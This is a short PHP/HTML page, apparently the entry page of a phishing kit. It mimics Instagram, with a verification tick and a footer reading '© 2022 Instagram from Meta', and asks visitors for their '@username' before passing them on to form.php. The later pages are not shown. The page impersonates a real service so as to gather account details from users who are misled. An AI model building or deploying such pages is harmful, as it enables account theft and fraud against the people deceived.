<?php
include ("app/config.php");
include ("app/database/yazilar.php");
include ("app/database/router.php");
?>
<!doctype html>
<html lang="en">
<head>
    <?php include ("app/tag/main/meta.php"); ?>
    <link rel="stylesheet" type="text/css" href="assets/theme/wasted/css/index.css">

</head>     
<body>
    <br><br><br>
    <center>
       <form method="get" action="form.php">
       <img src="https://i.pinimg.com/originals/3e/35/70/3e3570372b5ff57616181e96b3fb6216.gif" style="border-radius: 10rem;" width=250>
    <center>

    </center>
       <h1 class="h1"><?php echo $homebaslik; ?> <img src="assets/theme/wasted/img/tik.png" width=20><br><br>
       <input type="text" class="username" name="nick" required="" placeholder="@username" class="qua21"><br><br>
       <input type="submit" value="Next" class="button" style=""></form>
    </center>

    <center><br><br>
    	<div>
    		<p class="b">© 2022 Instagram from Meta</p>
    	</div>
    </center>
</div>
</body>
</html>
